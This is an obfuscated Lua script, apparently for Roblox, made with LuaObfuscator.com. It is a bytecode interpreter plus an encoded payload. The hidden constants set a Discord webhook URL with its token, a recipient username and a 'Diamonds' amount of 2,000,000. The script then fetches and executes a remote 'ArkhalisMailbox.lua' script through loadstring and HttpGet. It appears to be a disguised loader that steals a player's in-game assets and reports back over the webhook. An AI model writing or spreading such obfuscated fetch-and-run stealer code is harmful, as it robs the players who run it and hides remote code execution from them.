--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.2.8) ~  Much Love, Ferib 

]]--

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then local v83=0;while true do if (v83==0) then v19=v0(v3(v30,1,1));return "";end end else local v84=v2(v0(v30,16));if v19 then local v90=0;local v91;while true do if (v90==1) then return v91;end if (v90==0) then v91=v5(v84,v19);v19=nil;v90=1;end end else return v84;end end end);local function v20(v31,v32,v33)if v33 then local v85=0 -0 ;local v86;while true do if (v85==(0 -0)) then v86=(v31/(2^(v32-((1 + 0) -(877 -(282 + 595))))))%((4 -2)^(((v33-(620 -(555 + 64))) -(v32-(932 -(857 + 74)))) + (569 -(367 + 201)))) ;return v86-(v86%1) ;end end else local v87=2^(v32-(928 -(214 + 713))) ;return (((v31%(v87 + v87))>=v87) and 1) or (0 + (1637 -(1523 + 114))) ;end end local function v21()local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22()local v35=0 + 0 ;local v36;local v37;while true do if (v35==0) then v36,v37=v1(v16,v18,v18 + (2 -0) );v18=v18 + (1067 -((185 -(32 + 85)) + 997)) ;v35=1;end if (v35==(1271 -(222 + 4 + 1044))) then return (v37 * (1114 -858)) + v36 ;end end end local function v23()local v38,v39,v40,v41=v1(v16,v18,v18 + 1 + 2 );v18=v18 + (961 -(892 + 65)) ;return (v41 * (40022563 -23245347)) + (v40 * (121138 -(55952 -(87 + 263)))) + (v39 * ((649 -(67 + 113)) -213)) + v38 ;end local function v24()local v42=0 + 0 ;local v43;local v44;local v45;local v46;local v47;local v48;while true do if (v42==0) then v43=v23();v44=v23();v42=2 -1 ;end if (v42==(3 + 0)) then if (v47==(0 -0)) then if (v46==0) then return v48 * (952 -(802 + 150)) ;else local v101=430 -(44 + 386) ;while true do if (v101==(0 -0)) then v47=1 -(1486 -(998 + 488)) ;v45=0 + 0 + 0 ;break;end end end elseif (v47==2047) then return ((v46==(997 -(915 + 82))) and (v48 * ((2 -1)/0))) or (v48 * NaN) ;end return v8(v48,v47-(489 + 107 + 427) ) * (v45 + (v46/((2 -0)^(1239 -((1841 -(201 + 571)) + 118))))) ;end if (v42==(4 -2)) then v47=v20(v44,(79 -34) -24 ,6 + 25 );v48=((v20(v44,1170 -(116 + 1022) )==1) and  -(1 -0)) or (1 + 0) ;v42=794 -(368 + 423) ;end if (v42==1) then v45=3 -2 ;v46=(v20(v44,19 -(10 + 8) ,76 -56 ) * ((444 -(416 + 26))^(102 -70))) + v43 ;v42=(439 -(145 + 293)) + 1 ;end end end local function v25(v49)local v50;if  not v49 then v49=v23();if (v49==(0 -0)) then return "";end end v50=v3(v16,v18,(v18 + v49) -(4 -3) );v18=v18 + v49 ;local v51={};for v67=1 + 0 , #v50 do v51[v67]=v2(v1(v3(v50,v67,v67)));end return v6(v51);end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v52=0;local v53;local v54;local v55;local v56;local v57;local v58;local v59;local v60;while true do if (v52~=(2 + 2)) then else while true do if (v53==(609 -(454 + 152))) then v60=nil;while true do local v102=0;while true do if ((1 -0)==v102) then if (v54==(1290 -(993 + 295))) then local v115=0;local v116;while true do if (v115==0) then v116=0;while true do if ((0 + 0)==v116) then local v184=0;while true do if (v184~=(1172 -(418 + 753))) then else v116=1 + 0 ;break;end if (v184==0) then for v193=1 + 0 ,v59 do local v194=0 + 0 ;local v195;local v196;local v197;while true do if (v194~=1) then else v197=nil;while true do if (v195~=(0 + 0)) then else local v205=0;local v206;while true do if (v205==0) then v206=0;while true do if ((529 -(406 + 123))==v206) then local v213=1769 -(1749 + 20) ;while true do if (v213==(0 + 0)) then v196=v21();v197=nil;v213=1323 -(1249 + 73) ;end if (v213==1) then v206=1 + 0 ;break;end end end if (v206~=(1146 -(466 + 679))) then else v195=2 -1 ;break;end end break;end end end if (v195==(2 -1)) then if (v196==(1901 -(106 + 1794))) then v197=v21()~=0 ;elseif (v196==(1 + 1)) then v197=v24();elseif (v196==(1 + 2)) then v197=v25();end v60[v193]=v197;break;end end break;end if ((0 -0)~=v194) then else local v198=0 -0 ;while true do if (v198==(114 -(4 + 110))) then v195=584 -(57 + 527) ;v196=nil;v198=1428 -(41 + 1386) ;end if (v198~=1) then else v194=104 -(17 + 86) ;break;end end end end end v58[3 + 0 ]=v21();v184=1;end end end if (v116~=(1 -0)) then else for v188=2 -1 ,v23() do local v189=0;local v190;local v191;while true do if (v189~=(166 -(122 + 44))) then else v190=0 -0 ;v191=nil;v189=1;end if (1~=v189) then else while true do if (v190~=0) then else v191=v21();if (v20(v191,3 -2 ,1 + 0 )~=(0 + 0)) then else local v199=0 -0 ;local v200;local v201;local v202;local v203;local v204;while true do if (v199~=(66 -(30 + 35))) then else local v208=0;while true do if (v208==0) then v202=nil;v203=nil;v208=1;end if (v208==(1 + 0)) then v199=1259 -(1043 + 214) ;break;end end end if (v199~=(0 -0)) then else v200=0;v201=nil;v199=1;end if (v199==2) then v204=nil;while true do if (v200==(1213 -(323 + 889))) then local v209=0;local v210;while true do if (v209==(0 -0)) then v210=580 -(361 + 219) ;while true do if (v210==0) then local v225=0;while true do if (v225==(321 -(53 + 267))) then v210=1;break;end if (v225==(0 + 0)) then v203=nil;v204=nil;v225=1;end end end if (v210==1) then v200=415 -(15 + 398) ;break;end end break;end end end if (0==v200) then local v211=982 -(18 + 964) ;local v212;while true do if (v211==(0 -0)) then v212=0;while true do if (v212==(1 + 0)) then v200=1;break;end if (v212~=(0 + 0)) then else v201=850 -(20 + 830) ;v202=nil;v212=1 + 0 ;end end break;end end end if (2==v200) then while true do if (v201==(128 -(116 + 10))) then local v214=0;local v215;local v216;while true do if (0~=v214) then else v215=0;v216=nil;v214=1;end if (v214~=(1 + 0)) then else while true do if (v215~=(738 -(542 + 196))) then else v216=0;while true do if (v216~=0) then else if (v20(v203,1 -0 ,1)==(1 + 0)) then v204[2 + 0 ]=v60[v204[2]];end if (v20(v203,1 + 1 ,4 -2 )~=1) then else v204[7 -4 ]=v60[v204[3]];end v216=1552 -(1126 + 425) ;end if (v216~=(406 -(118 + 287))) then else v201=3;break;end end break;end end break;end end end if (v201==3) then if (v20(v203,11 -8 ,1124 -(118 + 1003) )==(2 -1)) then v204[381 -(142 + 235) ]=v60[v204[4]];end v55[v188]=v204;break;end if (v201~=(0 -0)) then else local v218=0;local v219;local v220;while true do if (v218~=(1 + 0)) then else while true do if (v219==0) then v220=0;while true do if (v220==(977 -(553 + 424))) then local v228=0;while true do if (1==v228) then v220=1;break;end if (v228~=0) then else v202=v20(v191,2,3);v203=v20(v191,7 -3 ,6 + 0 );v228=1;end end end if (1==v220) then v201=1;break;end end break;end end break;end if ((0 + 0)~=v218) then else v219=0 + 0 ;v220=nil;v218=1 + 0 ;end end end if (v201~=(1 + 0)) then else local v221=0 -0 ;local v222;while true do if (v221~=(0 -0)) then else v222=0 -0 ;while true do if (v222~=1) then else v201=2;break;end if (v222~=0) then else local v226=0;local v227;while true do if (v226~=0) then else v227=0;while true do if (v227~=1) then else v222=1 + 0 ;break;end if (v227~=(0 -0)) then else v204={v22(),v22(),nil,nil};if (v202==0) then local v233=0 + 0 ;local v234;local v235;while true do if (0==v233) then v234=0;v235=nil;v233=1;end if (v233~=1) then else while true do if ((0 + 0)==v234) then v235=0;while true do if (v235~=(0 -0)) then else v204[3]=v22();v204[4]=v22();break;end end break;end end break;end end elseif (v202==(1203 -(373 + 829))) then v204[734 -(476 + 255) ]=v23();elseif (v202==2) then v204[1133 -(369 + 761) ]=v23() -(2^16) ;elseif (v202~=3) then else local v238=0 + 0 ;local v239;local v240;while true do if (v238==(1 -0)) then while true do if (v239==0) then v240=0 -0 ;while true do if (v240~=(238 -(64 + 174))) then else v204[3]=v23() -((1 + 1)^16) ;v204[5 -1 ]=v22();break;end end break;end end break;end if (v238~=0) then else v239=0;v240=nil;v238=1;end end end v227=1;end end break;end end end end break;end end end end break;end end break;end end end break;end end break;end end end v54=339 -(144 + 192) ;break;end end break;end end end if (v54==(217 -(42 + 174))) then local v117=0 + 0 ;while true do if (v117==(0 + 0)) then local v172=0 + 0 ;while true do if (v172==1) then v117=1505 -(363 + 1141) ;break;end if (v172==0) then v58={v55,v56,nil,v57};v59=v23();v172=1 + 0 ;end end end if (1==v117) then v60={};v54=2 + 0 ;break;end end end break;end if (v102~=(1975 -(1913 + 62))) then else if (v54==(2 + 1)) then for v120=2 -1 ,v23() do v56[v120-1 ]=v28();end return v58;end if (v54~=(1933 -(565 + 1368))) then else local v118=0 -0 ;local v119;while true do if (v118~=0) then else v119=1661 -(1477 + 184) ;while true do if ((0 -0)~=v119) then else local v185=0 + 0 ;while true do if (v185==(856 -(564 + 292))) then v55={};v56={};v185=1 -0 ;end if (v185==1) then v119=2 -1 ;break;end end end if (v119~=1) then else v57={};v54=305 -(244 + 60) ;break;end end break;end end end v102=1;end end end break;end if ((2 + 0)==v53) then local v98=0;while true do if (v98~=(477 -(41 + 435))) then else v53=1004 -(938 + 63) ;break;end if (v98==0) then v58=nil;v59=nil;v98=1;end end end if (v53==(1 + 0)) then local v99=0;while true do if (v99~=0) then else v56=nil;v57=nil;v99=1126 -(936 + 189) ;end if (v99==1) then v53=1 + 1 ;break;end end end if (v53~=(1613 -(1565 + 48))) then else local v100=0 + 0 ;while true do if (v100~=0) then else v54=0;v55=nil;v100=1139 -(782 + 356) ;end if (v100~=(268 -(176 + 91))) then else v53=1;break;end end end end break;end if (v52==3) then v59=nil;v60=nil;v52=10 -6 ;end if (v52==(2 -0)) then v57=nil;v58=nil;v52=3;end if (v52~=1) then else v55=nil;v56=nil;v52=2;end if (v52==0) then v53=0;v54=nil;v52=1093 -(975 + 117) ;end end end local function v29(v61,v62,v63)local v64=v61[1];local v65=v61[2];local v66=v61[3];return function(...)local v69=v64;local v70=v65;local v71=v66;local v72=v27;local v73=1;local v74= -1;local v75={};local v76={...};local v77=v12("#",...) -1 ;local v78={};local v79={};for v88=0,v77 do if (v88>=v71) then v75[v88-v71 ]=v76[v88 + 1 ];else v79[v88]=v76[v88 + 1 ];end end local v80=(v77-v71) + 1 ;local v81;local v82;while true do local v89=0;while true do if (v89==1) then if (v82<=5) then if (v82<=2) then if (v82<=0) then local v103=0;local v104;local v105;local v106;local v107;while true do if (v103==1) then v74=(v106 + v104) -1 ;v107=0;v103=2;end if (v103==2) then for v173=v104,v74 do v107=v107 + 1 ;v79[v173]=v105[v107];end break;end if (v103==0) then v104=v81[2];v105,v106=v72(v79[v104](v13(v79,v104 + 1 ,v81[3])));v103=1;end end elseif (v82==1) then v79[v81[2]]=v63[v81[3]];else v79[v81[2]][v81[3]]=v81[4];end elseif (v82<=3) then local v108=0;local v109;local v110;local v111;local v112;local v113;while true do if (v108==4) then v73=v73 + 1 ;v81=v69[v73];v113=v81[2];v110,v111=v72(v79[v113](v13(v79,v113 + 1 ,v81[3])));v74=(v111 + v113) -1 ;v108=5;end if (v108==7) then v81=v69[v73];v73=v81[3];break;end if (v108==6) then v79[v113]=v79[v113](v13(v79,v113 + 1 ,v74));v73=v73 + 1 ;v81=v69[v73];v79[v81[2]]();v73=v73 + 1 ;v108=7;end if (3==v108) then v79[v113 + 1 ]=v112;v79[v113]=v112[v81[4]];v73=v73 + 1 ;v81=v69[v73];v79[v81[2]]=v81[3];v108=4;end if (v108==5) then v109=0;for v176=v113,v74 do local v177=0;while true do if (v177==0) then v109=v109 + 1 ;v79[v176]=v110[v109];break;end end end v73=v73 + 1 ;v81=v69[v73];v113=v81[2];v108=6;end if (v108==2) then v79[v81[2]]=v63[v81[3]];v73=v73 + 1 ;v81=v69[v73];v113=v81[2];v112=v79[v81[3]];v108=3;end if (v108==1) then v73=v73 + 1 ;v81=v69[v73];v79[v81[2]]=v63[v81[3]];v73=v73 + 1 ;v81=v69[v73];v108=2;end if (v108==0) then v109=nil;v110,v111=nil;v112=nil;v113=nil;v79[v81[2]][v81[3]]=v81[4];v108=1;end end elseif (v82==4) then v73=v81[3];else local v127=v81[2];v79[v127]=v79[v127](v13(v79,v127 + 1 ,v74));end elseif (v82<=8) then if (v82<=6) then local v114=0;while true do if (v114==4) then v73=v81[3];break;end if (v114==3) then v79[v81[2]]=v81[3];v73=v73 + 1 ;v81=v69[v73];v114=4;end if (v114==1) then v79[v81[2]]=v63[v81[3]];v73=v73 + 1 ;v81=v69[v73];v114=2;end if (v114==2) then v79[v81[2]][v81[3]]=v81[4];v73=v73 + 1 ;v81=v69[v73];v114=3;end if (0==v114) then v79[v81[2]][v81[3]]=v81[4];v73=v73 + 1 ;v81=v69[v73];v114=1;end end elseif (v82>7) then v79[v81[2]]=v81[3];else local v131=0;local v132;local v133;while true do if (v131==1) then v79[v132 + 1 ]=v133;v79[v132]=v133[v81[4]];break;end if (v131==0) then v132=v81[2];v133=v79[v81[3]];v131=1;end end end elseif (v82<=9) then do return;end elseif (v82>10) then v79[v81[2]]();elseif (v79[v81[2]]==v81[4]) then v73=v73 + 1 ;else v73=v81[3];end v73=v73 + 1 ;break;end if (v89==0) then v81=v69[v73];v82=v81[1];v89=1;end end end end;end return v29(v28(),{},v17)(...);end v15("LOL!0D3O00028O00026O00F03F03023O005F4703073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F3O31303534373835383539333136313331382F50394C7A396A2O337A70334D646B442D6F4776527655304448473061306447362D5570465135344D57354650535F616F50754A31796157434F3153303555304B3279464D030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403313O00682O7470733A2O2F61726B68616C69736C75612E6769746875622E696F2F41726B68616C69734D61696C626F782E6C756103083O00557365726E616D65030F3O00622O655F737761726D65723332313303083O004469616D6F6E6473024O0080841E41001E3O0012083O00013O00260A3O000D00010002002O043O000D0001001201000100033O00300300010004000500122O000100063O00122O000200073O00202O00020002000800122O000400096O000200046O00013O00024O00010001000100044O001D000100260A3O000100010001002O043O00010001001208000100013O00260A0001001400010002002O043O001400010012083O00023O002O043O0001000100260A0001001000010001002O043O00100001001201000200033O0030060002000A000B00122O000200033O00302O0002000C000D00122O000100023O00044O00100001002O043O000100012O00093O00017O00",v9(),...);end
